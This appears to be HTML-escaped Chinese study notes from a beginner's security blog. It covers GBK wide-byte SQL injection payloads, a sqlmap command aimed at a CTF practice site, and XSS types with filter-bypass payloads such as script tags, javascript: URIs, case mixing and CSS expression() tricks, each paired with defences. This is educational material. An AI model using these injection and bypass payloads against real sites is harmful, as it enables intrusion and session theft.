&lt;li&gt;手工注入&lt;br&gt;
可以使用 union 联合注入方法&lt;br&gt;
比如：?id=1% aa’ order by 1 --+&lt;br&gt;
?id=1%df’ order by 1 --+&lt;br&gt;
 这里表名 table_name 的值必须转换成 16 进制，如果不用 16 进制就得用引号包裹，当有 addlashes 函数就会转义引号，就会导致查询失败，使用 16 进制避免了这个问题。&lt;/li&gt;
&lt;li&gt;相类似操作进行爆库、爆表、爆值&lt;/li&gt;
&lt;li&gt;sqlmap&lt;br&gt;
sqlmap -u “&lt;a href=&#34;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1�&lt;/a&gt;’”&lt;/li&gt;
&lt;li&gt;脚本实现注入&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;xss&#34;&gt; XSS&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span id=&#34;xss漏洞介绍&#34;&gt; （xss）漏洞介绍&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;跨站脚本攻击 (Cross Site Scripting)，为了不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;XSS 漏洞普遍和流行的原因&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Web 浏览器本身的设计是不安全的。&lt;/li&gt;
&lt;li&gt;输入与输出是 Web 应用程序最基本的交互，在这过程之中若没做好安全防护&lt;/li&gt;
&lt;li&gt;程序员之间的水平参差不齐，很少有人受过正规的安全培训。&lt;/li&gt;
&lt;li&gt;不管是开发人员还是安全工程师，很多都没有真正意识到 XSS 漏洞的危害，导致这类漏洞普遍受到忽视。&lt;/li&gt;
&lt;li&gt;触发跨站脚本的方式非常简单，只要向 HTML 代码中注入脚本即可，而且执行此类攻击的手段众多&lt;/li&gt;
&lt;li&gt;黑客也就有了更广阔的空间发动 XSS 攻击。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;XSS 可能带来的危害&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;网络钓鱼，包括盗取各类用户账号；&lt;/li&gt;
&lt;li&gt;窃取用户 cookies 资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；&lt;/li&gt;
&lt;li&gt;劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等&lt;/li&gt;
&lt;li&gt;强制弹出广告页面、刷流量等；&lt;/li&gt;
&lt;li&gt;网页挂马；&lt;/li&gt;
&lt;li&gt;进行恶意操作，例如任意篡改页面信息、删除文章等；&lt;/li&gt;
&lt;li&gt;进行大量的客户端攻击，如 DDoS 攻击；&lt;/li&gt;
&lt;li&gt;获取客户端信息，例如用户的浏览历史、真实 IP、开放端口等；&lt;/li&gt;
&lt;li&gt;控制受害者机器向其他网站发起攻击；&lt;br&gt;
10. 结合其他漏洞，如 CSRF 漏洞，实施进一步作恶；&lt;br&gt;
11. 提升用户权限，包括进一步渗透网站；&lt;br&gt;
12. 传播跨站脚本蠕虫&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;反射型xss&#34;&gt; 反射型（xss）&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;前端 -&amp;gt; 后端 -&amp;gt; 前端&lt;br&gt;
反射型 XSS 的利用一般是攻击者通过特定手法（比如利用电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者单击这些专门设计的链接的时候，恶意 JavaScript 代码会直接在受害者主机上的浏览器执行。&lt;/p&gt;
&lt;p&gt;此类 XSS 通常出现在网站的搜索栏、用户登入口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。&lt;/p&gt;
&lt;p&gt;随着用户的安全意识增加，黑客们也会对 url 进行编码达到迷惑用户点击的目的。&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;存储型xss&#34;&gt; 存储型（xss）&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;持久型跨站脚本也等于存储型跨站脚本，比反射型跨站脚本更具威胁性，并且可能影响到 Web 服务器自身的安全。&lt;/p&gt;
&lt;p&gt;此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意 JavaScript 代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意 JavaScript 代码的页面就会执行恶意代码。&lt;/p&gt;
&lt;p&gt;攻击流程：前端 -&amp;gt; 后端 -&amp;gt; 数据库 -&amp;gt; 后端 -&amp;gt; 前端&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;发掘xss&#34;&gt; 发掘（XSS）&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;黑盒技术：通过对网站可疑地方入手，注入恶意代码攻击&lt;/li&gt;
&lt;li&gt;白盒技术：观察源代码以及关联文件代码，分析调用机制以及过滤机制。&lt;/li&gt;
&lt;li&gt;灰盒技术：黑盒和白盒的结合。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;攻的角度&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;如果用户可以随心所欲地引入 &amp;lt; &amp;gt; 等标记，那么他就能操作一个 HTML 标签，然后通过&lt;scirpt&gt;标签就能任意插入由 JavaScript 或 Vbscript 编写的恶意脚本代码。&lt;br&gt;
eg:&lt;script&gt;alert(‘XSS’); &lt;/script&gt;&lt;/scirpt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;假设用户不能构造自己的 HTML 标记，但是他们还可以使用其他，例如 HTML 标签的属性值。很多 HTML 标记中的属性都支持 javascript:[code] 伪协议的形式，这个特殊的协议类型声明了 URL 的主体是任意的 JavaScript 代码，由 JavaScript 的解释器运行。&lt;br&gt;
eg:&lt;table background=&#34;javascript:alert(/xss/)&#34;&gt;&lt;/table&gt;&lt;img&gt;src=“javascript:alert(‘XSS’);”&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果 XSS Filter 仅仅把敏感的输入字符列入黑名单处理，如对敏感字 javascript 而言，用户可以利用空格、回车和 Tab 键绕过限制。(自我认为，是 JS 的语法比较宽松，导致后续开发出现这个不可避免的漏洞)&lt;br&gt;
eg:&lt;img src=&#34;/2022/04/13/vulnerability/%E5%B0%8F%E7%99%BD%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/xss/)&#34; width=&#34;100&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对标签属性值转码&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;HTML 的属性值支持 ASCII 码 …&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;还可以把、等字符插入到 JavaScript 或 Vbscript 的头部，另外，Tab 符的 ASCII 码 、换行符的 、回车符的 可以被插入到代码中任意地方。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;
&lt;p&gt;产生自己的事件&lt;br&gt;
 JavaScript 与 HTML 之间的交互是通过事件来实现的，事件就是用户或浏览器自身执行的某种动作，比如 click、mouseover、load 等，而响应事件的函数就叫做事件处理函数（或事件侦听器）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 CSS 跨站剖析&lt;br&gt;
 XSS 跨站脚本的另一个载体是 CSS 样式表，使用 CSS 样式表执行 JavaScript 具有隐蔽、灵活多变等特点，但是 CSS 样式表有一个很大的缺点：各浏览器之间不能通用，甚者可能同一浏览器不同版本之间都不能通用 (expression、@import 和 link 方式…)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;扰乱过滤规则&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;转换大小写&lt;br&gt;
&lt;img src=&#34;javascript:alert(0);&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;大小写混淆&lt;br&gt;
&lt;img src=&#34;jaVasCript:alert(0);&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不用双引号，而是使用单引号&lt;br&gt;
&lt;img src=&#34;/2022/04/13/vulnerability/%E5%B0%8F%E7%99%BD%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/javascript:alert(0);&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不使用引号&lt;br&gt;
&lt;img src=&#34;/2022/04/13/vulnerability/%E5%B0%8F%E7%99%BD%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/javascript:alert(0);&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;…&lt;/p&gt;
&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;拆分跨站法&lt;br&gt;
拆分法跨站的核心是：把跨站代码拆分成几个片段，然后再使用某种方式将其拼凑在一起执行&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;nosql&#34;&gt; Nosql&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;它和 sql 注入漏洞差不多，只不过 nosql 适用于大型数据库，语法规则与 sql 略有差别。&lt;br&gt;
数据库：MongoDB&lt;/p&gt;
&lt;hr class=&#34;footnotes-sep&#34;&gt;
&lt;section class=&#34;footnotes&#34;&gt;
&lt;ol class=&#34;footnotes-list&#34;&gt;
&lt;li id=&#34;fn1&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;GFs &lt;a href=&#34;#fnref1&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn2&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;A-H &lt;a href=&#34;#fnref2&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;

 &lt;ol&gt;
&lt;li&gt;
&lt;p&gt;XSS 是一种被恶意注入不好的代码，然后在用户的软件或者浏览器中运行，通常原因是由于浏览器或者软件过滤不足，或者浏览一些不友好的博客文章&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;XSS 对服务器不具有毒害性，具有强烈的传播性，可以类似于病毒传播，借助于浏览器平台进行大肆传播&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;XSS 普遍原因：&lt;br&gt;
web 浏览器安全技术&lt;br&gt;
安全意识&lt;br&gt;
软件开发人员并没有在安全方面深入学习&lt;br&gt;
攻击范围多且广，防不胜防&lt;br&gt;
 XSS 最初是一种弹出对话框使用户输入信息的一种攻击性不强的技术，但是它和其他技术一起使用，很容易使网站瘫痪，造成很大的损失&lt;/p&gt;
 &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;反射型 XSS&lt;br&gt;
 将不好的代码注入到 URL 的地址参数中，在用户访问网站时，可以弹出对话框，只有用户点击时才会触发攻击，并且不会残留，所以只要用户具有安全意识，还是可以避免的，但是，有时候侵略者会用一些编码转换解决&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;持久型 XSS&lt;br&gt;
 这种恶意代码的伤害更大，它将恶意代码存入漏洞服务器中，只要用户访问此网址，代码就会自动执行，往往存在于博客文章中，当一个大网站被攻击时，在里面注册的用户很大可能就会被攻击，导致大批量的工作瘫痪，并且这种 XSS 更能轻易的写出危害性更大的代码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;发掘反射型的 XSS&lt;br&gt;
 在一些网页的搜索框内输入 XSS&lt;xss&gt;’ ‘’，按搜索，出现搜索内容，表示有反射型 XSS 漏洞，这是返回搜索框，在里面输入网页代码&lt;script&gt;(‘XSS’)&lt;script&gt;, 有漏洞的会弹出显示 XSS 的提示框，我们可以查看源代码，发现造成这个漏洞的原因是浏览器没有对一些特定的搜索符号如 ‘&amp;lt;‘  等进行过滤，使浏览器把这个搜索内容当作源代码中的一部分进行解析。&lt;br&gt;
其中，我们把输入代码，弹出 XSS 提示框的行为叫做黑盒技术，发现漏洞原因的这个行为叫做白盒技术&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;发掘持久型 XSS&lt;br&gt;
 在留言框等网页上输入&lt;script&gt;alert(/XSS/)&lt;/script&gt;，之后登录后台可以发现浏览器将这句代码直接进行了翻译，并没有过滤有害字符，导致了一个持久型存在于留言位置的 XSS 漏洞&lt;br&gt;
其中我们把即利用白盒技术也利用黑盒技术的行为叫做灰盒技术&lt;br&gt;
同时需要注意的是有时候不能将代码翻译出来原因在于标签前后开闭，注意增补标签，使浏览器顺利翻译出来&lt;/xss&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;XSS Cheat Sheet&lt;br&gt;
&lt;a href=&#34;http://ha.ckers.org/xss.html&#34;&gt;http://ha.ckers.org/xss.html&lt;/a&gt; 在这里面有很多测试用例可以方便用于 XSS 测试&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;进行以上两个简单的 XSS 测试时，发现几乎没有网站这么脆弱… 原因在于它们一般有一个好东西 ------XSS-Filter，中文名跨站脚本过滤器，实际上它就是一些用于过滤各种各样字符的一些函数，我们都知道，上有政策下有对策，所以尽管这段函数想的再精细，也防不胜防，总有一些空子可以钻，但是错误还是基本能防范的&lt;br&gt;
这个跨站脚本过滤器呢，有一个小特点，人们在设计它的时候，在里面加入了白名单和黑名单，白名单是可以完全信任的，当输入任何东西，可以不用过滤、消毒、筛选，就能直接发布，黑名单则不一样，要进行严格的过滤&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 &amp;lt; &amp;gt; 标记注射 Html /Javascript&lt;br&gt;
 攻：当用户浏览器没有过滤掉 &amp;lt;&amp;gt; 这些字符时，用户就可以利用 JS 或 Vbscript 进行一些代码编写，从而插入恶意脚本&lt;br&gt;
防：过滤掉 &amp;lt;&amp;gt; 或者&lt;script&gt;这些字符&lt;br&gt;
实践：很大一部分不可以&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 HTML 标签属性值执行 XSS&lt;br&gt;
 攻：这里首先先认识一下 javascript 伪协议，我简单的理解为在浏览器地址框中输入类似 javasript: 代码，冒号后面的代码会被 JS 的解释器运行，当然由于是伪代码的原因，也有部分浏览器是不支持的，支持的浏览器中也可以运用部分 HTML 标记的属性值进行 XSS&lt;br&gt;
 防：过滤 JavaScript 等关键字体   ，同时 Vbscript 的脚本也有可能被嵌入&lt;br&gt;
实践：360 可以   ，但是还是很容易暴露&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用空格回车 Tab&lt;br&gt;
 攻：在上一个方法中，浏览器只要过滤掉一些关键字符还是可以很轻松的防御漏洞，这时我们可以尝试一下在代码中加入空格回车或者 Tab，这时也许就不会被发现，浏览器往往为了迎合大众，尽可能的解析代码，所以往往一些语法规则不是很严格执行，造成了这些空子&lt;br&gt;
在这里，我们分析以下，这个代码可以执行的原因，在 JS 中，一个语句的完成是以分号为标准，所以只要我们的语句没有分号，浏览器就会一直翻译下去，直到遇见分号，当然如果我们同一行有两句代码，第一句的末尾就必须有分号&lt;br&gt;
实践：很容易暴露，基本无法实现&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对标签属性值转码&lt;br&gt;
攻：由于 html 支持 ASCII，所以可以将其中的部分敏感字符替换成 ASCII 码，同时，空格回车 Tab 键也可换成 ASSCII 码进行输入，还可以把、等字符插入到 JavaScript 或 Vbscript 的头部&lt;br&gt;
防：过滤关键字符&lt;br&gt;
实践：火狐直接不行，其他浏览器感觉也不能达到效果&lt;br&gt;
 14. 产生自己的事件。&lt;br&gt;
事件：&lt;br&gt;
攻： JavaScript 与 HTML 之间的交互是通过事件来实现的，举个栗子：&lt;br&gt;
&lt;input type=&#34;button&#34; value=&#34;click me&#34; onclick=&#34;alert(&#39;click me&#39;)&#34; /&gt;&lt;br&gt;
这是一个 HTML 代码中的事件处理程序，运行这段代码，当单击【click me】按钮后，会触发 onclick 事件，然后执行当中的 JavaScript&lt;br&gt;
 防：&lt;br&gt;
实践：基本浏览器都可以实现，火狐浏览器可以直接实现，但是 360 不会一开始就运行，会显示代码有风险，用户确认之后才能才能运行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 CSS 跨站剖析&lt;br&gt;
攻：顾名思义，就是在 CSS 中插入 JS 代码，然后运行，缺点就是有一部分浏览器不支持这种规则，就比较麻烦&lt;br&gt;
防：包含 expression、javascript、import 等敏感字符的样式表也要进行过滤。&lt;br&gt;
实践：基本都支持，并且正常运行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;扰乱过滤规则&lt;br&gt;
攻：上面介绍的几种方法只要跨站脚本过滤器做的足够细致，那么也是基本可以规避的。那么换个思路，我们的方法都是要被这个函数过滤掉，那么不如想想办法，怎样可以逃过跨站脚本过滤器的火眼金睛，以下总结几个常用的小技巧&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;转换大小写&lt;/li&gt;
&lt;li&gt;大小写混淆&lt;/li&gt;
&lt;li&gt;不用双引号，而是使用单引号的&lt;/li&gt;
&lt;li&gt;不使用引号&lt;/li&gt;
&lt;li&gt;插入 / 字符  &amp;lt;img/src=&amp;quot;mars.png&amp;quot;alt=“mars”&amp;gt; &amp;lt;img/src=“javascript:alert (‘XSS’);”&amp;gt;&lt;/li&gt;
&lt;li&gt;当利用 expression 执行跨站代码时，可以构造不同的全角字符来扰乱&lt;br&gt;
过滤规则：&lt;XSS STYLE=&#34;xss:exprEssion(alert(&#39;XSS&#39;))&#34;&gt; &lt;div style=&#34;{ left:expression( alert(&#39;xss&#39;) ) }&#34;&gt;&lt;br&gt;
全角：两个字节，一个字符的位置 (中文字符、标点符号)&lt;br&gt;
 半角：一个字节，半个字符的位置 (西文字母、标点符号)&lt;/li&gt;
&lt;li&gt;样式表中的 // 会被浏览器忽略，因此可以运用 // 来注释字符&lt;/li&gt;
&lt;li&gt;样式标签中的 \ 和结束符 \0 也是被浏览器忽略的&lt;/li&gt;
&lt;li&gt;将 CSS 中的关键字进行转码处理，如将 e 转换成 \65，包括改变&lt;br&gt;
编码中 0 的数量&lt;br&gt;
当然，只要你能想到，就用这些方法进行各种叠加尝试，不过，最后是否能成功和浏览器对这些代码的渲染以及解释有关，这些差异和细节都可能引起各种不同 XSS，所以要深入的了解这些转换方法还得多积累&lt;/li&gt;
&lt;/ul&gt;
&lt;/script&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;
